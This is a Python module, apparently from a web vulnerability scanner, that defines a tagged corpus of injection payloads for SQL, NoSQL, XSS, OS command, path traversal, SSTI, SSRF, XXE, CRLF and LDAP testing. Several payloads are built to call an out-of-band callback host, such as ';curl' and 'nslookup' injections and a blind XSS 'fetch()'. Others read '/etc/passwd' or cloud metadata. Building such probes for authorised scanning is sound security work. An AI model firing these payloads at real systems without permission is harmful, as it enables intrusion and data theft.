"""Built-in tagged payload corpus.

Each payload is tagged by vuln class + injection context so the resolver can pick
what fits a fingerprinted parameter. ``oob=True`` payloads require OAST
substitution and detect blind variants.
"""

from __future__ import annotations

from dataclasses import dataclass, field

OAST_URL = "{{OAST_URL}}"
OAST_DOMAIN = "{{OAST_DOMAIN}}"


@dataclass(frozen=True)
class Payload:
    value: str
    vuln_class: str
    context: str  # sql | html | attr | js | os | path | xml | ssti | url | header | nosql | ldap
    tags: frozenset[str] = field(default_factory=frozenset)
    oob: bool = False


CORPUS: tuple[Payload, ...] = (
    # SQL injection
    Payload("'", "sqli", "sql", frozenset({"error"})),
    Payload("' OR '1'='1", "sqli", "sql", frozenset({"boolean"})),
    Payload("1' AND SLEEP(5)-- -", "sqli", "sql", frozenset({"time"})),
    Payload(
        "1;SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'." + OAST_DOMAIN + "'))",
        "sqli",
        "sql",
        frozenset({"oob"}),
        oob=True,
    ),
    # NoSQL injection
    Payload('{"$ne": null}', "nosqli", "nosql", frozenset({"auth-bypass"})),
    Payload("[$gt]=", "nosqli", "nosql", frozenset({"operator"})),
    # Cross-site scripting
    Payload("<script>alert(1)</script>", "xss", "html", frozenset({"reflected"})),
    Payload('"><svg onload=alert(1)>', "xss", "attr", frozenset({"attr-break"})),
    Payload("';alert(1)//", "xss", "js", frozenset({"js-context"})),
    Payload(
        "<img src=x onerror=\"fetch('" + OAST_URL + "')\">",
        "xss",
        "html",
        frozenset({"blind", "oob"}),
        oob=True,
    ),
    # OS command injection
    Payload(";id", "cmdi", "os", frozenset({"separator"})),
    Payload("|id", "cmdi", "os", frozenset({"pipe"})),
    Payload("$(id)", "cmdi", "os", frozenset({"subshell"})),
    Payload(";curl " + OAST_URL, "cmdi", "os", frozenset({"blind", "oob"}), oob=True),
    Payload(";nslookup " + OAST_DOMAIN, "cmdi", "os", frozenset({"blind", "oob"}), oob=True),
    # Path traversal / LFI
    Payload("../../../../etc/passwd", "path_traversal", "path", frozenset({"unix"})),
    Payload("..%2f..%2f..%2fetc%2fpasswd", "path_traversal", "path", frozenset({"encoded"})),
    Payload("....//....//etc/passwd", "path_traversal", "path", frozenset({"filter-bypass"})),
    # SSTI
    Payload("{{7*7}}", "ssti", "ssti", frozenset({"jinja", "twig"})),
    Payload("${7*7}", "ssti", "ssti", frozenset({"freemarker", "el"})),
    Payload("<%= 7*7 %>", "ssti", "ssti", frozenset({"erb"})),
    # SSRF
    Payload("http://169.254.169.254/latest/meta-data/", "ssrf", "url", frozenset({"metadata"})),
    Payload("http://" + OAST_DOMAIN + "/", "ssrf", "url", frozenset({"blind", "oob"}), oob=True),
    # XXE
    Payload(
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://'
        + OAST_DOMAIN
        + '/x">]><r>&x;</r>',
        "xxe",
        "xml",
        frozenset({"blind", "oob"}),
        oob=True,
    ),
    # Open redirect
    Payload("//evil.example", "open_redirect", "url", frozenset({"protocol-relative"})),
    # CRLF
    Payload("%0d%0aSet-Cookie:lalo=1", "crlf", "header", frozenset({"header-injection"})),
    # LDAP
    Payload("*)(uid=*))(|(uid=*", "ldapi", "ldap", frozenset({"filter-break"})),
)
